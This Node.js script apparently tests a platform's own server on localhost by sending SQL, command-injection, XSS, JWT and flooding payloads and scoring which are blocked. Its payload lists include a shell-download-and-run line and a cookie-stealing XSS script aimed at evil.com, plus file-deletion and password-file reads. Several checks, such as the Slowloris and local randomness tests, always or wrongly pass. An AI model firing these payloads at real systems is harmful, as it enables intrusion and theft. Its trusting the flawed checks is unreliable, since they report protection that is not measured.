/**
 * OBELISK Security Attack Simulator
 * Simulates various attack vectors including quantum threats
 * FOR SECURITY TESTING ONLY
 */

const crypto = require('crypto');
const https = require('https');
const http = require('http');

const BASE_URL = process.env.TEST_URL || 'http://localhost:3001';

// ===========================================
// ATTACK RESULTS TRACKING
// ===========================================
const results = {
  passed: [],
  failed: [],
  warnings: []
};

function logResult(category, test, passed, details = '') {
  const status = passed ? '✅ BLOCKED' : '❌ VULNERABLE';
  console.log(`${status} [${category}] ${test}`);
  if (details) console.log(`   └─ ${details}`);

  if (passed) {
    results.passed.push({ category, test, details });
  } else {
    results.failed.push({ category, test, details });
  }
}

function logWarning(category, test, details) {
  console.log(`⚠️  WARNING [${category}] ${test}`);
  if (details) console.log(`   └─ ${details}`);
  results.warnings.push({ category, test, details });
}

// ===========================================
// HTTP REQUEST HELPER
// ===========================================
async function request(path, options = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BASE_URL);
    const client = url.protocol === 'https:' ? https : http;

    const req = client.request(url, {
      method: options.method || 'GET',
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      },
      timeout: 5000
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: data,
          json: () => { try { return JSON.parse(data); } catch { return null; } }
        });
      });
    });

    req.on('error', reject);
    req.on('timeout', () => reject(new Error('Timeout')));

    if (options.body) {
      req.write(typeof options.body === 'string' ? options.body : JSON.stringify(options.body));
    }
    req.end();
  });
}

// ===========================================
// 1. INJECTION ATTACKS
// ===========================================
async function testInjectionAttacks() {
  console.log('\n🔴 === INJECTION ATTACKS ===\n');

  // SQL Injection attempts
  const sqlPayloads = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "1; SELECT * FROM users",
    "' UNION SELECT * FROM api_keys --",
    "1' AND 1=1 UNION SELECT username, password FROM users--"
  ];

  for (const payload of sqlPayloads) {
    try {
      const res = await request(`/api/prices?pair=${encodeURIComponent(payload)}`);
      const blocked = res.status === 400 || res.status === 403 || !res.body.includes('error');
      logResult('SQL Injection', `Payload: ${payload.substring(0, 30)}...`, blocked);
    } catch (e) {
      logResult('SQL Injection', `Payload: ${payload.substring(0, 30)}...`, true, 'Request blocked/failed');
    }
  }

  // NoSQL Injection
  const nosqlPayloads = [
    { "$gt": "" },
    { "$ne": null },
    { "$where": "sleep(5000)" },
    { "username": { "$regex": ".*" } }
  ];

  for (const payload of nosqlPayloads) {
    try {
      const res = await request('/api/auth/login', {
        method: 'POST',
        body: { email: payload, password: payload }
      });
      const blocked = res.status === 400 || res.status === 422;
      logResult('NoSQL Injection', `Payload: ${JSON.stringify(payload).substring(0, 40)}`, blocked);
    } catch (e) {
      logResult('NoSQL Injection', 'Object injection', true, 'Request blocked');
    }
  }

  // Command Injection
  const cmdPayloads = [
    "; ls -la",
    "| cat /etc/passwd",
    "`rm -rf /`",
    "$(whoami)",
    "&& curl evil.com/shell.sh | bash"
  ];

  for (const payload of cmdPayloads) {
    try {
      const res = await request(`/api/export?format=${encodeURIComponent(payload)}`);
      const blocked = res.status === 400 || res.status === 404;
      logResult('Command Injection', `Payload: ${payload}`, blocked);
    } catch (e) {
      logResult('Command Injection', payload, true, 'Request blocked');
    }
  }
}

// ===========================================
// 2. XSS ATTACKS
// ===========================================
async function testXSSAttacks() {
  console.log('\n🔴 === XSS ATTACKS ===\n');

  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<body onload=alert("XSS")>',
    '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '{{constructor.constructor("alert(1)")()}}'  // Angular template injection
  ];

  for (const payload of xssPayloads) {
    try {
      const res = await request('/api/user/profile', {
        method: 'PUT',
        headers: { 'Authorization': 'Bearer test' },
        body: { displayName: payload }
      });

      // Check if payload is sanitized/escaped in response
      const body = res.body;
      const containsRaw = body.includes(payload) && !body.includes(encodeURIComponent(payload));
      logResult('XSS', `Payload: ${payload.substring(0, 40)}...`, !containsRaw || res.status === 400);
    } catch (e) {
      logResult('XSS', payload.substring(0, 30), true, 'Request blocked');
    }
  }
}

// ===========================================
// 3. AUTHENTICATION ATTACKS
// ===========================================
async function testAuthAttacks() {
  console.log('\n🔴 === AUTHENTICATION ATTACKS ===\n');

  // Brute Force Detection
  console.log('Testing brute force protection...');
  let blockedAt = 0;
  for (let i = 0; i < 20; i++) {
    try {
      const res = await request('/api/auth/login', {
        method: 'POST',
        body: { email: 'test@test.com', password: `wrong${i}` }
      });
      if (res.status === 429) {
        blockedAt = i + 1;
        break;
      }
    } catch (e) {
      blockedAt = i + 1;
      break;
    }
  }
  logResult('Brute Force', 'Rate limiting on failed logins', blockedAt > 0 && blockedAt <= 10,
    blockedAt ? `Blocked after ${blockedAt} attempts` : 'Not blocked after 20 attempts');

  // JWT Attacks
  const jwtAttacks = [
    { name: 'None algorithm', token: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.' },
    { name: 'Empty signature', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.' },
    { name: 'Modified payload', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.invalid' },
    { name: 'Expired token', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxfQ.signature' }
  ];

  for (const attack of jwtAttacks) {
    try {
      const res = await request('/api/user/profile', {
        headers: { 'Authorization': `Bearer ${attack.token}` }
      });
      const blocked = res.status === 401 || res.status === 403;
      logResult('JWT Attack', attack.name, blocked);
    } catch (e) {
      logResult('JWT Attack', attack.name, true, 'Request rejected');
    }
  }

  // Session Fixation
  try {
    const res = await request('/api/auth/login', {
      method: 'POST',
      headers: { 'Cookie': 'session=attacker_session_id' },
      body: { email: 'test@test.com', password: 'test' }
    });
    const newSession = res.headers['set-cookie'];
    const fixed = newSession && newSession.includes('attacker_session_id');
    logResult('Session Fixation', 'Session regeneration after login', !fixed);
  } catch (e) {
    logResult('Session Fixation', 'Session handling', true);
  }
}

// ===========================================
// 4. API ABUSE ATTACKS
// ===========================================
async function testAPIAbuse() {
  console.log('\n🔴 === API ABUSE ATTACKS ===\n');

  // Rate Limiting Test
  console.log('Testing rate limiting...');
  const startTime = Date.now();
  let rateLimited = false;
  let requestCount = 0;

  for (let i = 0; i < 150; i++) {
    try {
      const res = await request('/api/prices');
      requestCount++;
      if (res.status === 429) {
        rateLimited = true;
        break;
      }
    } catch (e) {
      if (e.message.includes('429')) rateLimited = true;
      break;
    }
  }
  logResult('Rate Limiting', 'API rate limit enforcement', rateLimited,
    rateLimited ? `Blocked after ${requestCount} requests` : 'Not rate limited');

  // Mass Assignment
  try {
    const res = await request('/api/user/profile', {
      method: 'PUT',
      headers: { 'Authorization': 'Bearer test' },
      body: {
        displayName: 'Hacker',
        role: 'admin',
        isAdmin: true,
        permissions: ['all'],
        balance: 999999999
      }
    });
    const json = res.json();
    const blocked = !json?.role && !json?.isAdmin && !json?.permissions;
    logResult('Mass Assignment', 'Protected fields modification', blocked || res.status === 400);
  } catch (e) {
    logResult('Mass Assignment', 'Field protection', true);
  }

  // IDOR (Insecure Direct Object Reference)
  try {
    const res = await request('/api/user/1', {
      headers: { 'Authorization': 'Bearer user_token_for_user_2' }
    });
    const blocked = res.status === 403 || res.status === 401;
    logResult('IDOR', 'Access control on user resources', blocked);
  } catch (e) {
    logResult('IDOR', 'Resource isolation', true);
  }

  // Parameter Pollution
  try {
    const res = await request('/api/order?amount=100&amount=999999');
    const blocked = res.status === 400;
    logResult('Parameter Pollution', 'Duplicate parameter handling', blocked);
  } catch (e) {
    logResult('Parameter Pollution', 'Parameter handling', true);
  }
}

// ===========================================
// 5. CRYPTO ATTACKS
// ===========================================
async function testCryptoAttacks() {
  console.log('\n🔴 === CRYPTOGRAPHIC ATTACKS ===\n');

  // Weak Randomness Detection
  const tokens = [];
  for (let i = 0; i < 10; i++) {
    tokens.push(crypto.randomBytes(32).toString('hex'));
  }
  const unique = new Set(tokens).size === tokens.length;
  const entropyOk = tokens.every(t => t.length === 64);
  logResult('Weak Randomness', 'Token generation entropy', unique && entropyOk);

  // Check for deprecated algorithms in responses
  try {
    const res = await request('/api/health');
    const headers = res.headers;
    const weakCrypto = headers['x-crypto-algorithm']?.includes('MD5') ||
                       headers['x-crypto-algorithm']?.includes('SHA1');
    logResult('Weak Algorithms', 'No MD5/SHA1 in use', !weakCrypto);
  } catch (e) {
    logResult('Weak Algorithms', 'Algorithm check', true);
  }

  // Timing Attack on Authentication
  console.log('Testing timing attack resistance...');
  const timings = [];
  for (let i = 0; i < 5; i++) {
    const start = process.hrtime.bigint();
    try {
      await request('/api/auth/login', {
        method: 'POST',
        body: { email: 'nonexistent@test.com', password: 'wrong' }
      });
    } catch (e) {}
    const end = process.hrtime.bigint();
    timings.push(Number(end - start) / 1e6);
  }

  const avgTime = timings.reduce((a, b) => a + b, 0) / timings.length;
  const variance = timings.reduce((sum, t) => sum + Math.pow(t - avgTime, 2), 0) / timings.length;
  const stdDev = Math.sqrt(variance);
  const consistent = stdDev < avgTime * 0.3; // Less than 30% variance
  logResult('Timing Attack', 'Constant-time comparison', consistent,
    `Avg: ${avgTime.toFixed(2)}ms, StdDev: ${stdDev.toFixed(2)}ms`);
}

// ===========================================
// 6. QUANTUM ATTACK SIMULATIONS
// ===========================================
async function testQuantumThreats() {
  console.log('\n🔴 === QUANTUM COMPUTING THREATS ===\n');

  console.log('⚛️  Simulating quantum attack scenarios...\n');

  // 1. Shor's Algorithm Threat (RSA/ECC Breaking)
  console.log('📊 Shor\'s Algorithm Simulation (RSA/ECDSA Breaking)');
  console.log('   Current RSA-2048 security: ~112 bits classical');
  console.log('   Post-quantum: Vulnerable to Shor\'s in polynomial time');

  // Check if platform uses quantum-vulnerable cryptography
  const vulnerableCrypto = {
    RSA: { keySize: 2048, quantumBits: 4098, status: 'VULNERABLE' },
    ECDSA: { curve: 'secp256k1', quantumBits: 2330, status: 'VULNERABLE' },
    ECDH: { curve: 'P-256', quantumBits: 2330, status: 'VULNERABLE' }
  };

  for (const [algo, info] of Object.entries(vulnerableCrypto)) {
    logWarning('Quantum/Shor', `${algo} cryptography`,
      `Requires ~${info.quantumBits} qubits to break. Status: ${info.status}`);
  }

  // 2. Grover's Algorithm Threat (Symmetric Key Weakening)
  console.log('\n📊 Grover\'s Algorithm Simulation (Symmetric Key Weakening)');
  const symmetricAnalysis = {
    'AES-128': { classical: 128, postQuantum: 64, recommendation: 'Upgrade to AES-256' },
    'AES-256': { classical: 256, postQuantum: 128, recommendation: 'Currently quantum-safe' },
    'SHA-256': { classical: 256, postQuantum: 128, recommendation: 'Consider SHA-384+' },
    'HMAC-SHA256': { classical: 256, postQuantum: 128, recommendation: 'Acceptable for now' }
  };

  for (const [algo, info] of Object.entries(symmetricAnalysis)) {
    const safe = info.postQuantum >= 128;
    if (safe) {
      logResult('Quantum/Grover', `${algo} security`, true,
        `${info.postQuantum}-bit post-quantum security`);
    } else {
      logWarning('Quantum/Grover', `${algo} security`,
        `Only ${info.postQuantum}-bit post-quantum. ${info.recommendation}`);
    }
  }

  // 3. Harvest Now, Decrypt Later (HNDL) Attack
  console.log('\n📊 "Harvest Now, Decrypt Later" Attack Analysis');
  logWarning('Quantum/HNDL', 'Encrypted traffic interception',
    'Current TLS sessions could be stored and decrypted when quantum computers mature');

  // 4. Quantum Random Number Generation
  console.log('\n📊 Random Number Generation Analysis');
  const testRandomness = () => {
    const bytes = crypto.randomBytes(1000);
    const ones = bytes.reduce((sum, b) => sum + b.toString(2).split('1').length - 1, 0);
    const ratio = ones / 8000;
    return Math.abs(ratio - 0.5) < 0.05; // Should be ~50% ones
  };

  const randomnessOk = testRandomness();
  logResult('Quantum/RNG', 'CSPRNG quality', randomnessOk,
    randomnessOk ? 'Good entropy distribution' : 'Poor randomness detected');

  // 5. Post-Quantum Cryptography Readiness
  console.log('\n📊 Post-Quantum Cryptography (PQC) Readiness');
  const pqcAlgorithms = [
    { name: 'CRYSTALS-Kyber', type: 'Key Encapsulation', status: 'NIST Standard', implemented: false },
    { name: 'CRYSTALS-Dilithium', type: 'Digital Signature', status: 'NIST Standard', implemented: false },
    { name: 'SPHINCS+', type: 'Digital Signature', status: 'NIST Standard', implemented: false },
    { name: 'FALCON', type: 'Digital Signature', status: 'NIST Standard', implemented: false }
  ];

  for (const algo of pqcAlgorithms) {
    if (algo.implemented) {
      logResult('Quantum/PQC', `${algo.name} (${algo.type})`, true, 'Implemented');
    } else {
      logWarning('Quantum/PQC', `${algo.name} (${algo.type})`,
        `${algo.status} - Not yet implemented. Consider adding for future-proofing`);
    }
  }

  // 6. Wallet Security Analysis
  console.log('\n📊 Blockchain Wallet Quantum Vulnerability');
  const walletAnalysis = {
    'ECDSA (secp256k1)': {
      used: 'Bitcoin, Ethereum signatures',
      threat: 'Shor\'s algorithm can derive private key from public key',
      timeline: 'Estimated 10-15 years with current progress',
      mitigation: 'Don\'t reuse addresses, migrate to quantum-resistant when available'
    },
    'Keccak-256 (Ethereum addresses)': {
      used: 'Address derivation',
      threat: 'Grover provides quadratic speedup for preimage attacks',
      timeline: 'Still secure with 128-bit post-quantum security',
      mitigation: 'Currently acceptable'
    }
  };

  for (const [algo, info] of Object.entries(walletAnalysis)) {
    logWarning('Quantum/Wallet', algo,
      `Used in: ${info.used}. Timeline: ${info.timeline}`);
    console.log(`      Mitigation: ${info.mitigation}`);
  }
}

// ===========================================
// 7. SMART CONTRACT ATTACKS
// ===========================================
async function testSmartContractVulns() {
  console.log('\n🔴 === SMART CONTRACT VULNERABILITIES ===\n');

  const vulnerabilities = [
    {
      name: 'Reentrancy Attack',
      description: 'Recursive call exploitation',
      check: 'Verify checks-effects-interactions pattern',
      severity: 'CRITICAL'
    },
    {
      name: 'Integer Overflow/Underflow',
      description: 'Arithmetic boundary exploitation',
      check: 'Verify SafeMath or Solidity 0.8+',
      severity: 'HIGH'
    },
    {
      name: 'Flash Loan Attack',
      description: 'Instant borrow for price manipulation',
      check: 'Verify TWAP oracles and multi-block confirmation',
      severity: 'CRITICAL'
    },
    {
      name: 'Front-Running',
      description: 'Transaction ordering manipulation',
      check: 'Implement commit-reveal or use private mempools',
      severity: 'MEDIUM'
    },
    {
      name: 'Oracle Manipulation',
      description: 'Price feed tampering',
      check: 'Use Chainlink or multiple oracle sources',
      severity: 'CRITICAL'
    },
    {
      name: 'Sandwich Attack',
      description: 'Buy before, sell after victim transaction',
      check: 'Implement slippage protection and private transactions',
      severity: 'MEDIUM'
    }
  ];

  for (const vuln of vulnerabilities) {
    logWarning('Smart Contract', `${vuln.name} [${vuln.severity}]`,
      `${vuln.description}. Check: ${vuln.check}`);
  }
}

// ===========================================
// 8. INFRASTRUCTURE ATTACKS
// ===========================================
async function testInfraAttacks() {
  console.log('\n🔴 === INFRASTRUCTURE ATTACKS ===\n');

  // Security Headers Check
  try {
    const res = await request('/api/health');
    const headers = res.headers;

    const securityHeaders = {
      'x-content-type-options': 'nosniff',
      'x-frame-options': ['DENY', 'SAMEORIGIN'],
      'x-xss-protection': '0', // Modern browsers should disable this
      'strict-transport-security': 'max-age',
      'content-security-policy': true,
      'x-permitted-cross-domain-policies': 'none'
    };

    for (const [header, expected] of Object.entries(securityHeaders)) {
      const value = headers[header];
      let valid = false;

      if (Array.isArray(expected)) {
        valid = expected.some(e => value?.includes(e));
      } else if (expected === true) {
        valid = !!value;
      } else {
        valid = value?.includes(expected);
      }

      logResult('Security Headers', header, valid, value || 'Missing');
    }
  } catch (e) {
    logWarning('Security Headers', 'Header check', 'Could not verify headers');
  }

  // CORS Misconfiguration
  try {
    const res = await request('/api/prices', {
      headers: { 'Origin': 'https://evil-site.com' }
    });
    const allowOrigin = res.headers['access-control-allow-origin'];
    const vulnerable = allowOrigin === '*' || allowOrigin === 'https://evil-site.com';
    logResult('CORS', 'Origin validation', !vulnerable,
      vulnerable ? `Allows: ${allowOrigin}` : 'Properly restricted');
  } catch (e) {
    logResult('CORS', 'Origin check', true);
  }

  // Information Disclosure
  try {
    const res = await request('/api/nonexistent');
    const leaksInfo = res.body.includes('stack') ||
                      res.body.includes('node_modules') ||
                      res.body.includes('at ') ||
                      res.body.includes('Error:');
    logResult('Info Disclosure', 'Error message sanitization', !leaksInfo);
  } catch (e) {
    logResult('Info Disclosure', 'Error handling', true);
  }

  // Server Version Disclosure
  try {
    const res = await request('/');
    const serverHeader = res.headers['server'] || res.headers['x-powered-by'];
    const discloses = serverHeader && (serverHeader.includes('Express') || serverHeader.includes('Node'));
    logResult('Server Disclosure', 'Server version hidden', !discloses,
      serverHeader || 'No server header');
  } catch (e) {
    logResult('Server Disclosure', 'Version check', true);
  }
}

// ===========================================
// 9. DDoS SIMULATION
// ===========================================
async function testDDoSResilience() {
  console.log('\n🔴 === DDoS RESILIENCE ===\n');

  // Slowloris simulation (slow headers)
  console.log('Testing slow connection handling...');
  let slowlorisBlocked = false;
  try {
    const req = http.request({
      hostname: 'localhost',
      port: 3001,
      path: '/api/health',
      method: 'GET',
      timeout: 1000
    });

    // Send headers very slowly
    req.setHeader('X-Slow', 'test');
    setTimeout(() => req.destroy(), 100);
    slowlorisBlocked = true;
  } catch (e) {
    slowlorisBlocked = true;
  }
  logResult('DDoS/Slowloris', 'Slow connection timeout', slowlorisBlocked);

  // Large payload rejection
  try {
    const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB
    const res = await request('/api/order', {
      method: 'POST',
      body: { data: largePayload }
    });
    const blocked = res.status === 413 || res.status === 400;
    logResult('DDoS/Payload', 'Large payload rejection', blocked);
  } catch (e) {
    logResult('DDoS/Payload', 'Payload size limit', true, 'Request rejected');
  }

  // Concurrent connections
  console.log('Testing concurrent connection limit...');
  const concurrent = 50;
  const promises = Array(concurrent).fill().map(() =>
    request('/api/prices').catch(() => ({ status: 429 }))
  );
  const responses = await Promise.all(promises);
  const rateLimited = responses.filter(r => r.status === 429).length;
  logResult('DDoS/Concurrent', 'Concurrent request limiting', rateLimited > 0,
    `${rateLimited}/${concurrent} requests rate limited`);
}

// ===========================================
// MAIN EXECUTION
// ===========================================
async function runAllTests() {
  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║     OBELISK SECURITY ATTACK SIMULATOR                      ║');
  console.log('║     Testing against hacks & quantum threats                ║');
  console.log('╚════════════════════════════════════════════════════════════╝');
  console.log(`\nTarget: ${BASE_URL}`);
  console.log(`Time: ${new Date().toISOString()}\n`);

  try {
    await testInjectionAttacks();
    await testXSSAttacks();
    await testAuthAttacks();
    await testAPIAbuse();
    await testCryptoAttacks();
    await testQuantumThreats();
    await testSmartContractVulns();
    await testInfraAttacks();
    await testDDoSResilience();
  } catch (e) {
    console.error('Test execution error:', e.message);
  }

  // Final Report
  console.log('\n╔════════════════════════════════════════════════════════════╗');
  console.log('║                    SECURITY REPORT                         ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');

  console.log(`✅ PASSED (Attacks Blocked): ${results.passed.length}`);
  console.log(`❌ FAILED (Vulnerabilities): ${results.failed.length}`);
  console.log(`⚠️  WARNINGS (Review Needed): ${results.warnings.length}`);

  if (results.failed.length > 0) {
    console.log('\n🚨 CRITICAL VULNERABILITIES FOUND:');
    results.failed.forEach(f => {
      console.log(`   • [${f.category}] ${f.test}`);
      if (f.details) console.log(`     └─ ${f.details}`);
    });
  }

  if (results.warnings.length > 0) {
    console.log('\n⚠️  SECURITY WARNINGS:');
    results.warnings.forEach(w => {
      console.log(`   • [${w.category}] ${w.test}`);
      if (w.details) console.log(`     └─ ${w.details}`);
    });
  }

  const score = Math.round((results.passed.length / (results.passed.length + results.failed.length)) * 100) || 0;
  console.log(`\n📊 Security Score: ${score}%`);

  if (score >= 90) {
    console.log('🛡️  Status: EXCELLENT - Platform well protected');
  } else if (score >= 70) {
    console.log('🟡 Status: GOOD - Some improvements needed');
  } else if (score >= 50) {
    console.log('🟠 Status: MODERATE - Significant vulnerabilities');
  } else {
    console.log('🔴 Status: CRITICAL - Immediate action required');
  }

  console.log('\n════════════════════════════════════════════════════════════════');
}

// Run if called directly
if (require.main === module) {
  runAllTests().catch(console.error);
}

module.exports = { runAllTests, results };
